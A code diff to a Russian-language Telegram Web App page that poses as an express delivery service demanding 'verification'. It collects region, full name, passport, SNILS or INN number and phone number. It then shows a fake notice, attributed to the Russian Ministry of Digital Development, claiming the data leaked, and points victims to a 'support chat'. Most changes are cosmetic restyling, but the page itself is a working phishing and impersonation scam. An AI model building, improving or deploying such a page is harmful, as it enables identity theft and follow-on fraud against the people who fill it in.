@@ -12,8 +12,33 @@
         body { 
             font-family: 'Inter', sans-serif; 
             background-color: #ffffff;
+            /* Узор как на сайте */
+            background-image: url('photo_2026-02-18_15-09-44.jpg');
+            background-repeat: repeat;
             margin: 0;
             color: #1a1a1a;
+            transition: background 0.3s ease;
+        }
+
+        /* Добавляем белый полупрозрачный фон под контент */
+        .content-card {
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(4px); /* Легкое размытие для премиального вида */
+            border-radius: 24px;
+            padding: 24px 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+        }
+
+        /* Убираем фон на экране блокировки */
+        body.is-blocked {
+            background-image: none !important;
+            background-color: #ffffff;
+        }
+        
+        body.is-blocked .content-card {
+            background: transparent;
+            box-shadow: none;
+            backdrop-filter: none;
         }
 
         .header-app {
@@ -68,6 +93,7 @@
             align-items: center;
             justify-content: space-between;
             transition: all 0.2s;
+            background: white; /* Делаем кнопки выбора непрозрачными */
         }
 
         .select-card:active {
@@ -108,109 +134,110 @@
     </header>
 
     <main class="container-main">
+        <div class="content-card">
+            
+            <div id="welcome" class="fade-in text-center py-10">
+                <img src="https://cdn-icons-png.flaticon.com/512/709/709806.png" class="icon-large" alt="welcome">
+                <h1 class="text-2xl font-bold mb-3">Сервис экспресс-доставки</h1>
+                <p class="text-gray-500 mb-10 text-sm px-4">Для использования личного кабинета необходимо пройти верификацию данных.</p>
+                <button onclick="show('step1')" class="btn-primary">Продолжить</button>
+            </div>
 
-        <div id="welcome" class="fade-in text-center py-10">
-            <img src="https://cdn-icons-png.flaticon.com/512/709/709806.png" class="icon-large" alt="welcome">
-            <h1 class="text-2xl font-bold mb-3">Сервис экспресс-доставки</h1>
-            <p class="text-gray-500 mb-10 text-sm px-4">Для использования личного кабинета необходимо пройти верификацию данных.</p>
-            <button onclick="show('step1')" class="btn-primary">Продолжить</button>
-        </div>
-
-        <div id="step1" class="hidden fade-in">
-            <h2 class="text-xl font-bold mb-6 text-center">Выберите ваш регион</h2>
-            <div class="space-y-3">
-                <div onclick="save('region', 'ДНР'); show('step2')" class="select-card">
-                    <span class="font-medium text-gray-700">Донецкая Народная Республика</span>
-                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
-                </div>
-                <div onclick="save('region', 'ЛНР'); show('step2')" class="select-card">
-                    <span class="font-medium text-gray-700">Луганская Народная Республика</span>
-                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
-                </div>
-                <div onclick="save('region', 'Запорожье'); show('step2')" class="select-card">
-                    <span class="font-medium text-gray-700">Запорожская область</span>
-                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
-                </div>
-                <div onclick="save('region', 'Херсон'); show('step2')" class="select-card">
-                    <span class="font-medium text-gray-700">Херсонская область</span>
-                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
-                </div>
-                <div onclick="save('region', 'Крым'); show('step2')" class="select-card">
-                    <span class="font-medium text-gray-700">Республика Крым</span>
-                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
-                </div>
-                <div onclick="save('region', 'Ростовская обл.'); show('step2')" class="select-card">
-                    <span class="font-medium text-gray-700">Ростовская область</span>
-                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+            <div id="step1" class="hidden fade-in">
+                <h2 class="text-xl font-bold mb-6 text-center">Выберите ваш регион</h2>
+                <div class="space-y-3">
+                    <div onclick="save('region', 'ДНР'); show('step2')" class="select-card">
+                        <span class="font-medium text-gray-700">Донецкая Народная Республика</span>
+                        <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                    </div>
+                    <div onclick="save('region', 'ЛНР'); show('step2')" class="select-card">
+                        <span class="font-medium text-gray-700">Луганская Народная Республика</span>
+                        <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                    </div>
+                    <div onclick="save('region', 'Запорожье'); show('step2')" class="select-card">
+                        <span class="font-medium text-gray-700">Запорожская область</span>
+                        <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                    </div>
+                    <div onclick="save('region', 'Херсон'); show('step2')" class="select-card">
+                        <span class="font-medium text-gray-700">Херсонская область</span>
+                        <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                    </div>
+                    <div onclick="save('region', 'Крым'); show('step2')" class="select-card">
+                        <span class="font-medium text-gray-700">Республика Крым</span>
+                        <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                    </div>
+                    <div onclick="save('region', 'Ростовская обл.'); show('step2')" class="select-card">
+                        <span class="font-medium text-gray-700">Ростовская область</span>
+                        <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" class="w-4 h-4" alt="arrow">
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <div id="step2" class="hidden fade-in">
-            <h2 class="text-xl font-bold mb-2">Введите ФИО</h2>
-            <p class="text-xs text-gray-400 mb-6">Введите полные данные как в паспорте</p>
-            <input id="name" type="text" placeholder="Фамилия Имя Отчество" class="input-standard" />
-            <button onclick="saveInput('name', 'step3')" class="btn-primary">Далее</button>
-        </div>
+            <div id="step2" class="hidden fade-in">
+                <h2 class="text-xl font-bold mb-2">Введите ФИО</h2>
+                <p class="text-xs text-gray-400 mb-6">Введите полные данные как в паспорте</p>
+                <input id="name" type="text" placeholder="Фамилия Имя Отчество" class="input-standard" />
+                <button onclick="saveInput('name', 'step3')" class="btn-primary">Далее</button>
+            </div>
 
-        <div id="step3" class="hidden fade-in text-center">
-            <h2 class="text-xl font-bold mb-6">Подтверждение личности</h2>
-            <div class="space-y-3">
-                <div onclick="setDocType('Паспорт')" class="select-card">
-                    <span>Паспорт РФ</span>
-                    <img src="https://cdn-icons-png.flaticon.com/512/2910/2910756.png" class="icon-png" alt="doc">
-                </div>
-                <div onclick="setDocType('СНИЛС')" class="select-card">
-                    <span>СНИЛС</span>
-                    <img src="https://cdn-icons-png.flaticon.com/512/2910/2910756.png" class="icon-png" alt="doc">
-                </div>
-                <div onclick="setDocType('ИНН')" class="select-card">
-                    <span>ИНН</span>
-                    <img src="https://cdn-icons-png.flaticon.com/512/2910/2910756.png" class="icon-png" alt="doc">
+            <div id="step3" class="hidden fade-in text-center">
+                <h2 class="text-xl font-bold mb-6">Подтверждение личности</h2>
+                <div class="space-y-3">
+                    <div onclick="setDocType('Паспорт')" class="select-card">
+                        <span>Паспорт РФ</span>
+                        <img src="https://cdn-icons-png.flaticon.com/512/2910/2910756.png" class="icon-png" alt="doc">
+                    </div>
+                    <div onclick="setDocType('СНИЛС')" class="select-card">
+                        <span>СНИЛС</span>
+                        <img src="https://cdn-icons-png.flaticon.com/512/2910/2910756.png" class="icon-png" alt="doc">
+                    </div>
+                    <div onclick="setDocType('ИНН')" class="select-card">
+                        <span>ИНН</span>
+                        <img src="https://cdn-icons-png.flaticon.com/512/2910/2910756.png" class="icon-png" alt="doc">
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <div id="step4" class="hidden fade-in text-center">
-            <h2 id="docTitle" class="text-xl font-bold mb-6">Номер документа</h2>
-            <input id="docNumber" type="tel" class="input-standard text-center text-lg tracking-widest" oninput="limitDocInput(this)" />
-            <p id="docError" class="text-red-500 text-xs mb-6 hidden">Ошибка в количестве цифр</p>
-            <button onclick="validateDoc()" class="btn-primary">Подтвердить</button>
-        </div>
-
-        <div id="step5" class="hidden fade-in text-center">
-            <h2 class="text-xl font-bold mb-6">Контактный телефон</h2>
-            <input id="phone" type="tel" placeholder="+7 (___) ___-__-__" class="input-standard text-center text-lg" oninput="formatPhone(this)" maxlength="18" />
-            <button onclick="saveInput('phone', 'check')" class="btn-primary">К проверке</button>
-        </div>
-
-        <div id="check" class="hidden fade-in">
-            <h2 class="text-xl font-bold mb-6">Проверьте анкету</h2>
-            <div class="bg-gray-50 p-6 rounded-2xl space-y-4 mb-8">
-                <div class="flex justify-between border-b pb-2"><span class="text-gray-400">Регион:</span><b id="prevRegion"></b></div>
-                <div class="flex justify-between border-b pb-2"><span class="text-gray-400">ФИО:</span><b id="prevName"></b></div>
-                <div class="flex justify-between border-b pb-2"><span class="text-gray-400">Документ:</span><b id="prevDoc"></b></div>
-                <div class="flex justify-between"><span class="text-gray-400">Телефон:</span><b id="prevPhone"></b></div>
+            <div id="step4" class="hidden fade-in text-center">
+                <h2 id="docTitle" class="text-xl font-bold mb-6">Номер документа</h2>
+                <input id="docNumber" type="tel" class="input-standard text-center text-lg tracking-widest" oninput="limitDocInput(this)" />
+                <p id="docError" class="text-red-500 text-xs mb-6 hidden">Ошибка в количестве цифр</p>
+                <button onclick="validateDoc()" class="btn-primary">Подтвердить</button>
             </div>
-            <button onclick="startFinish()" class="btn-primary">Отправить данные</button>
-        </div>
 
-        <div id="loading" class="hidden fade-in text-center py-20">
-            <div class="w-12 h-12 border-4 border-gray-100 border-t-red-600 rounded-full animate-spin mx-auto mb-6"></div>
-            <p class="font-bold text-gray-500">Связь с базой данных...</p>
-        </div>
-
-        <div id="blocked" class="hidden fade-in lock-screen">
-            <img src="https://cdn-icons-png.flaticon.com/512/1828/1828843.png" class="w-16 h-16 mx-auto mb-6" alt="blocked">
-            <h1 class="text-xl font-bold text-red-600 mb-4 uppercase">БОТ ЗАБЛОКИРОВАН</h1>
-            <div class="text-sm text-gray-600 text-left space-y-4 leading-relaxed mb-8">
-                <p><b>Данный сервис заблокирован Министерством связи и массовых коммуникаций Российской Федерации из-за подозрения в мошенничестве:</b> Ваши персональные данные были переданы по незащищенному каналу. С вами свяжутся представители Минцифр России.</p>
-                <p>Для ускорения процесса разбирательства, напишите в официальный чат поддержки.</p>
+            <div id="step5" class="hidden fade-in text-center">
+                <h2 class="text-xl font-bold mb-6">Контактный телефон</h2>
+                <input id="phone" type="tel" placeholder="+7 (___) ___-__-__" class="input-standard text-center text-lg" oninput="formatPhone(this)" maxlength="18" />
+                <button onclick="saveInput('phone', 'check')" class="btn-primary">К проверке</button>
             </div>
-            <a id="supportBtn" href="#" class="block w-full bg-zinc-900 text-white py-4 rounded-xl font-bold text-center">Чат поддержки Минцифры</a>
-        </div>
 
-    </main>
+            <div id="check" class="hidden fade-in">
+                <h2 class="text-xl font-bold mb-6">Проверьте анкету</h2>
+                <div class="bg-gray-50 p-6 rounded-2xl space-y-4 mb-8">
+                    <div class="flex justify-between border-b pb-2"><span class="text-gray-400">Регион:</span><b id="prevRegion"></b></div>
+                    <div class="flex justify-between border-b pb-2"><span class="text-gray-400">ФИО:</span><b id="prevName"></b></div>
+                    <div class="flex justify-between border-b pb-2"><span class="text-gray-400">Документ:</span><b id="prevDoc"></b></div>
+                    <div class="flex justify-between"><span class="text-gray-400">Телефон:</span><b id="prevPhone"></b></div>
+                </div>
+                <button onclick="startFinish()" class="btn-primary">Отправить данные</button>
+            </div>
+
+            <div id="loading" class="hidden fade-in text-center py-20">
+                <div class="w-12 h-12 border-4 border-gray-100 border-t-red-600 rounded-full animate-spin mx-auto mb-6"></div>
+                <p class="font-bold text-gray-500">Связь с базой данных...</p>
+            </div>
+
+            <div id="blocked" class="hidden fade-in lock-screen">
+                <img src="https://cdn-icons-png.flaticon.com/512/1828/1828843.png" class="w-16 h-16 mx-auto mb-6" alt="blocked">
+                <h1 class="text-xl font-bold text-red-600 mb-4 uppercase">БОТ ЗАБЛОКИРОВАН</h1>
+                <div class="text-sm text-gray-600 text-left space-y-4 leading-relaxed mb-8">
+                    <p><b>Данный сервис заблокирован Министерством связи и массовых коммуникаций Российской Федерации из-за подозрения в мошенничестве:</b> Ваши персональные данные были переданы по незащищенному каналу. С вами свяжутся представители Минцифр России.</p>
+                    <p>Для ускорения процесса разбирательства, напишите в официальный чат поддержки.</p>
+                </div>
+                <a id="supportBtn" href="#" class="block w-full bg-zinc-900 text-white py-4 rounded-xl font-bold text-center">Чат поддержки Минцифры</a>
+            </div>
+
+        </div> </main>
 
 <script>
     const tg = window.Telegram.WebApp;
@@ -229,6 +256,13 @@
         });
         document.getElementById(id).classList.remove('hidden');
         
+        // Условие для экрана блокировки (убираем фон и тени)
+        if (id === 'blocked') {
+            document.body.classList.add('is-blocked');
+        } else {
+            document.body.classList.remove('is-blocked');
+        }
+        
         if (id === 'check') {
             document.getElementById('prevName').textContent = answers.name || '-';
             document.getElementById('prevRegion').textContent = answers.region || '-';
@@ -237,8 +271,7 @@
         }
     }
 
-        function save(key, value) { 
-        // Если сохраняем регион, дублируем его в ключ 'gender' для бэкенда
+    function save(key, value) { 
         if (key === 'region') {
             answers['gender'] = value; 
         }
